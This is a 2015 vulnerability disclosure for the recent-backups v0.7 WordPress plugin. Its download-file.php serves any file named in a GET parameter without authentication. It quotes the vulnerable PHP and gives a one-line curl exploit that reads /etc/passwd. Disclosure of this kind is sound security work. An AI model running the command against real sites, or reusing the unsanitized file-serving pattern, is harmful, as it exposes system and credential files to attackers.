@@ -1,0 +1,31 @@
+Title: Remote file download vulnerability in recent-backups v0.7 wordpress plugin
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-07-13
+Download Site: https://wordpress.org/plugins/recent-backups
+Vendor: https://profiles.wordpress.org/andycheeseman/
+Vendor Notified: 0000-00-00
+Vendor Contact: plugins@wordpress.org
+Description: To be used with the BackupWordPress plugin to list the contents of the backup directory in a dashboard widget.
+Vulnerability:
+The code in  download-file.php doesn't verify the user is logged in or sanitize what files can be downloaded.  This vulnerability can be used
+to download sensitive system files:
+
+     2  $file = $_GET['file_link'];
+     3  
+     4  if (file_exists($file)) {
+     5      header('Content-Description: File Transfer');
+     6      header('Content-Type: application/octet-stream');
+     7      header('Content-Disposition: attachment; filename='.basename($file));
+     8      header('Content-Transfer-Encoding: binary');
+     9      header('Expires: 0');
+    10      header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+    11      header('Pragma: public');
+    12      header('Content-Length: ' . filesize($file));
+    13      ob_clean();
+    14      flush();
+    15      readfile($file);
+
+CVEID:
+OSVDB:
+Exploit Code:
+  • $ curl -v "http://server/wp-content/plugins/recent-backups/download-file.php?file_link=/etc/passwd
